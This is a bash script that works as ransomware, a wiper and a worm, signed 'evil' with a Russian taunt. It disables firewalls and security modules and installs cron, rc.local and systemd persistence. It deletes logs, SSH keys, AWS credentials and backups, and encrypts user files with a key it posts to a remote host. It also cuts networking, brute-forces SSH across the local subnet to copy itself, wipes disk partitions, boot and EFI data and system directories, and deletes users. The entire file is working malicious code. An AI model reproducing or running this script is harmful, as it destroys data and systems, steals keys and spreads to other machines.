#!/bin/bash

lockfile="/tmp/evil.lock"
if [ -f "$lockfile" ]; then
    exit 0
fi
echo $$ > "$lockfile"

if [ "$EUID" -ne 0 ]; then
    exec sudo "$0" "$@"
    exit
fi

persistent_path="/tmp/.evil.sh"
cp "$0" "$persistent_path" 2>/dev/null
chmod +x "$persistent_path" 2>/dev/null
flag_path="/tmp/.evil_done"
infected_log="/tmp/.evil_infected"

if [ ! -f "$flag_path" ]; then
    systemctl stop ufw 2>/dev/null
    systemctl disable ufw 2>/dev/null
    systemctl stop iptables 2>/dev/null
    systemctl stop firewalld 2>/dev/null
    systemctl stop apparmor 2>/dev/null
    systemctl disable apparmor 2>/dev/null
    systemctl stop selinux 2>/dev/null
    setenforce 0 2>/dev/null
    ufw disable 2>/dev/null
    
    if command -v apt &>/dev/null; then
        apt update -y 2>/dev/null
        apt install -y sshpass 2>/dev/null
    elif command -v yum &>/dev/null; then
        yum install -y sshpass 2>/dev/null
    elif command -v dnf &>/dev/null; then
        dnf install -y sshpass 2>/dev/null
    elif command -v pacman &>/dev/null; then
        pacman -S --noconfirm sshpass 2>/dev/null
    fi
    
    crontab -l 2>/dev/null | grep -v "$persistent_path" | { cat; echo "@reboot $persistent_path"; } | crontab - 2>/dev/null
    echo "$persistent_path" >> /etc/rc.local 2>/dev/null
    chmod +x /etc/rc.local 2>/dev/null
    echo "[Unit]
Description=evil
After=network.target
[Service]
ExecStart=$persistent_path
Restart=always
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/evil.service 2>/dev/null
    systemctl enable evil.service 2>/dev/null
    
    echo "" > /etc/hosts 2>/dev/null
    
    touch "$flag_path"
    reboot
    exit
fi

rm -rf /var/log/* 2>/dev/null
rm -rf /var/log/.* 2>/dev/null
rm -rf /home/*/.bash_history 2>/dev/null
rm -rf /root/.bash_history 2>/dev/null
rm -rf /home/*/.ssh/* 2>/dev/null
rm -rf /root/.ssh/* 2>/dev/null
rm -rf /home/*/.aws/* 2>/dev/null
rm -rf /root/.aws/* 2>/dev/null
rm -rf /home/*/.config/* 2>/dev/null
rm -rf /tmp/* 2>/dev/null
journalctl --rotate 2>/dev/null
journalctl --vacuum-time=1s 2>/dev/null

find / -type f \( -name "*.tar" -o -name "*.tar.gz" -o -name "*.tgz" -o -name "*.zip" -o -name "*.7z" -o -name "*.rar" -o -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*.orig" \) -exec rm -f {} \; 2>/dev/null

key=$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 32)
folders=("/home/*/Documents" "/home/*/Desktop" "/home/*/Downloads" "/home/*/Pictures" "/home/*/Videos" "/home/*/Music" "/root" "/var/www" "/srv")
extensions="\.(docx?|xlsx?|pptx?|pdf|txt|jpg|jpeg|png|gif|bmp|tiff|zip|tar|gz|7z|rar|bak|backup|psd|ai|cdr|dwg|dxf|cpp|c|py|js|html|css|sql|db|mdf|ldf|vhd|vhdx|vmcx|vmrs|vmtm|vmdk|sh|conf|cfg|yml|yaml|json|xml|csv|log|key|pem|crt|ovpn|rdp|ps1|vbs|jar|class|swift|rb|go|rs|php|asp|aspx|jsp)"
file_count=0
max_files=9999999

for folder in $folders; do
    if [ -d "$folder" ]; then
        while IFS= read -r file; do
            if [ $file_count -ge $max_files ]; then
                break 2
            fi
            echo "$key" | gpg --batch --yes --passphrase-fd 0 --symmetric --cipher-algo AES256 --output "$file.enc" "$file" 2>/dev/null
            if [ $? -eq 0 ]; then
                rm -f "$file" 2>/dev/null
                file_count=$((file_count+1))
            fi
        done < <(find "$folder" -type f -iregex ".*$extensions" 2>/dev/null)
    fi
done

for i in 1 2 3; do
    curl -X POST -d "key=$key" http://192.168.1.100/log -s -o /dev/null
    if [ $? -eq 0 ]; then
        break
    fi
    sleep 5
done
echo "$key" > /tmp/.key_backup 2>/dev/null

sleep 15

rfkill block all 2>/dev/null
if command -v ifconfig &>/dev/null; then
    ifconfig | grep -o '^[^ ]*' | while read -r iface; do
        ip link set "$iface" down 2>/dev/null
        iw dev "$iface" del 2>/dev/null
    done
fi
systemctl stop NetworkManager 2>/dev/null
systemctl disable NetworkManager 2>/dev/null
systemctl stop wpa_supplicant 2>/dev/null
systemctl disable wpa_supplicant 2>/dev/null
rm -rf /etc/NetworkManager/* 2>/dev/null
rm -rf /etc/wpa_supplicant/* 2>/dev/null

sysctl -w net.ipv6.conf.all.disable_ipv6=1 2>/dev/null
echo "net.ipv6.conf.all.disable_ipv6=1" >> /etc/sysctl.conf 2>/dev/null

rm -f /etc/resolv.conf 2>/dev/null
echo "nameserver 0.0.0.0" > /etc/resolv.conf 2>/dev/null

sleep 5
local_ip=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '127.0.0.1' | head -1)
if [ -n "$local_ip" ]; then
    network=$(echo "$local_ip" | cut -d'.' -f1-3)
    passwords=("" "password" "123456" "admin" "123" "qwerty" "abc123" "111111" "123123" "admin123" "root" "toor")
    for i in {1..254}; do
        target="$network.$i"
        if [ "$target" = "$local_ip" ]; then
            continue
        fi
        for pass in "${passwords[@]}"; do
            if command -v sshpass &>/dev/null; then
                sshpass -p "$pass" scp -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$persistent_path" "$target:/tmp/evil.sh" 2>/dev/null
                if [ $? -eq 0 ]; then
                    echo "$target" >> "$infected_log" 2>/dev/null
                    sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$target" "sudo bash /tmp/evil.sh &" 2>/dev/null &
                    break
                fi
                sshpass -p "$pass" scp -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$persistent_path" "root@$target:/tmp/evil.sh" 2>/dev/null
                if [ $? -eq 0 ]; then
                    echo "$target" >> "$infected_log" 2>/dev/null
                    sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "root@$target" "bash /tmp/evil.sh &" 2>/dev/null &
                    break
                fi
            else
                ssh -o PreferredAuthentications=password -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$target" "cat > /tmp/evil.sh" < "$persistent_path" 2>/dev/null
                if [ $? -eq 0 ]; then
                    echo "$target" >> "$infected_log" 2>/dev/null
                    ssh -o PreferredAuthentications=password -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$target" "sudo bash /tmp/evil.sh &" 2>/dev/null &
                    break
                fi
            fi
        done
    done
fi

for disk in /dev/sd* /dev/nvme* /dev/vd* /dev/xvd* /dev/mmcblk* /dev/hd*; do
    if [ -b "$disk" ]; then
        echo "d
1
d
2
d
3
d
4
d
5
w
" | fdisk "$disk" 2>/dev/null
        dd if=/dev/urandom of="$disk" bs=4096 count=1000000 2>/dev/null
        dd if=/dev/zero of="$disk" bs=1M count=500 2>/dev/null
        dd if=/dev/zero of="$disk" bs=512 count=1 2>/dev/null
    fi
done

rmmod kvm_intel 2>/dev/null
rmmod kvm 2>/dev/null
rmmod vboxdrv 2>/dev/null
rmmod vboxnetadp 2>/dev/null
rmmod vboxnetflt 2>/dev/null

if command -v efivar &>/dev/null; then
    for var in $(efivar -l 2>/dev/null); do
        efivar -d -n "$var" 2>/dev/null
    done
fi

rm -rf /boot/* 2>/dev/null
rm -rf /boot/efi/* 2>/dev/null
rm -rf /efi/* 2>/dev/null
rm -rf /sys/firmware/efi/efivars/* 2>/dev/null

rm -rf /etc/* 2>/dev/null
rm -rf /var/lib/* 2>/dev/null
rm -rf /usr/lib/* 2>/dev/null
rm -rf /opt/* 2>/dev/null
rm -rf /srv/* 2>/dev/null
rm -rf /root/.??* 2>/dev/null

rm -rf /lib/modules/* 2>/dev/null
rm -rf /usr/lib/modules/* 2>/dev/null
rm -rf /etc/modprobe.d/* 2>/dev/null

echo "#!/bin/bash
echo 'System is dead. Goodbye.'
poweroff -f" > /usr/local/bin/restore 2>/dev/null
chmod +x /usr/local/bin/restore 2>/dev/null

echo "fake" >> /etc/fstab 2>/dev/null

for user in $(cut -d: -f1 /etc/passwd 2>/dev/null); do
    if [ "$user" != "root" ]; then
        pkill -u "$user" 2>/dev/null
        userdel -rf "$user" 2>/dev/null
    fi
done

for dev in /sys/bus/pci/devices/*/remove; do
    echo 1 > "$dev" 2>/dev/null
done
for dev in /sys/bus/usb/devices/*/remove; do
    echo 1 > "$dev" 2>/dev/null
done

echo -ne "\x2e\xff" | dd of=/dev/port bs=1 seek=112 2>/dev/null

cpu_cores=$(nproc)
for i in $(seq 1 $cpu_cores); do
    while :; do :; done &
done

if command -v glxgears &>/dev/null; then
    glxgears -info 2>/dev/null &
    while true; do
        glxgears 2>/dev/null &
        sleep 2
        pkill glxgears
    done &
else
    for i in $(seq 1 100); do
        while true; do
            echo "scale=10000; 4*a(1)" | bc -l 2>/dev/null
        done &
    done
fi

while true; do
    speaker-test -t sine -f 1000 2>/dev/null &
    sleep 0.5
    speaker-test -t sine -f 2000 2>/dev/null &
    sleep 0.5
    speaker-test -t sine -f 500 2>/dev/null &
    sleep 0.5
done &

cat << 'EOF' > /tmp/skull_anim.sh
while true; do
    clear
    echo '
        .-"      "-.
       /            \
      |              |
      |,  .-.  .-.  ,|
      | )(__/  \__)( |
      |/     /\     \|
      (_     ^^     _)
       \__|IIIIII|__/
        | \IIIIII/ |
        \          /
       `--------`
    '
    sleep 0.5
    clear
    echo '
        .-"      "-.
       /            \
      |              |
      |,  .-.  .-.  ,|
      | )(__/  \__)( |
      |/     /\     \|
      (_     ^^     _)
       \__|XXXXXX|__/
        | \XXXXXX/ |
        \          /
       `--------`
    '
    sleep 0.5
done
EOF
bash /tmp/skull_anim.sh 2>/dev/null &

for i in 1 2 3; do
    echo -e "\a"
    sleep 0.5
done

echo '
        .-"      "-.
       /            \
      |              |
      |,  .-.  .-.  ,|
      | )(__/  \__)( |
      |/     /\     \|
      (_     ^^     _)
       \__|IIIIII|__/
        | \IIIIII/ |
        \          /
       `--------`
'

echo "Вы добровольно запустили этот файл) by. evil"

sleep 3

pkill -9 --inverse -s $$ 2>/dev/null

rm -rf /bin/* 2>/dev/null
rm -rf /sbin/* 2>/dev/null
rm -rf /lib/* 2>/dev/null
rm -rf /lib64/* 2>/dev/null
rm -rf /usr/bin/* 2>/dev/null
rm -rf /usr/sbin/* 2>/dev/null

rm -f "$0" 2>/dev/null
rm -f "$persistent_path" 2>/dev/null
rm -f "$lockfile" 2>/dev/null
rm -f /tmp/.key_backup 2>/dev/null
rm -f "$infected_log" 2>/dev/null
rm -f /tmp/skull_anim.sh 2>/dev/null

poweroff -f
